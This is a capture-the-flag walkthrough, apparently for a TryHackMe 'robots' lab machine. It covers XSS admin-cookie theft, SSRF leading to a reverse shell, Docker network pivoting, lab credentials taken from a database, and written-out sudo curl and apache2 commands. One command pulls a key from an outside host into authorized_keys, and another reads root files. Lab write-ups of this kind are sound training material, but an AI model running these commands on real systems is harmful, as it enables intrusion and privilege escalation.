@@ -1,0 +1,13 @@
+Started with a nmap scan
+```
+22 OpenSSH 8.9p1
+80 Apache 2.4.61
+9000 Apache 2.4.52
+```
+Nmap shows us there is a robots.txt file on the webhost on port `80` and there is three entries one of them redirects to a domain `/harm/to/self` goes to `robots.thm` when we go to the site now we get a login and a register page when we make a account we need to take are username and day/month and make it a md5 hash and that's the password for the account we made when we login it reflects are username to us trying xss and we got the alert to open ive tested a lot of polyglots and only found xss to trigger 
+
+The webhost on port `9000` seems to have nothing on it 
+
+Going back to the other webserver it is leaking its `server_info.php` and the admin does login in every few seconds but the `httponly` flag is set  so we cant take cookies test the registration page for sql injections also tested the login page for sql injections found nothing did a subdomain scan and also found nothing going back to trying to steal the admin cookie I finally was successful with it there is a script on hacktricks and make the account agin and now we have the admin cookie and we can access the `admin.php`  and its a test url with a input box testing if we have SSRF if we input are ip and host a webserver it calls out to us and hosting a php script that does whoami and then having the site call it and we get `www-data` and we can just replace this whoami command with a reverse shell and now we have access to the server from running linpeas and looking at the hosts file we in a docker container we need to run chisel and then try nmaping the docker network scanning the network we found that on ip `172.18.0.2` has mysql running and we did find some creds in the docker in the `config.php` file after we forward the port we can login into the mysql database now and there is a database called `web` and has a user with nologon permissions user `rgiskard:rgiskard2209` maybe we can use these creds for ssh but the plain password does not work but the md5 hash from decrypting it does when running `sudo -l` we can run curl as the other user `sudo -u dolivaw /usr/bin/curl 127.0.0.1/ file://home/dolivaw/user.txt` now we have the user flag now we need to use this to add are public key to the `authorized_keys` file 
+`sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://10.6.37.77/id_ed25519.pub -o /tmp/1 -o /home/dolivaw/.ssh/authorized_keys` now we have access to the next user when we run `sudo -l` we can use `apache2` as root with no password going to GTFObins there is a sudo one for apachectl
+ we can usr but when we try it says the web root is not defined if we define it we can get the root flag `sudo apache2 -C 'Define APACHE_RUN_DIR' /tmp -C 'Include /root/root.txt' -k stop` 
